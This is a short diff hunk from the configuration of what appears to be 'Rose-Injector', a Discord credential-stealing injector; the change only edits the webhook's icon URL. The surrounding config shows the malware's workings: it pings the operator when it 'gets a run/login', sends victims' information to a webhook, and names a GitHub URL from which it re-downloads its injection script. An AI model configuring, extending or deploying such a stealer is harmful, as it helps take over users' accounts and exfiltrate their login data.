@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Rose-Injector', //name of the webhook thats gonna send the info
-  embed_icon: 'https://i.imgur.com/EZFAJXh.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://i.imgur.com/EZFAJXh.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/Gum-s/Rose-Injector/main/injection/injection.js', //injection url for when it reinjects
   /**
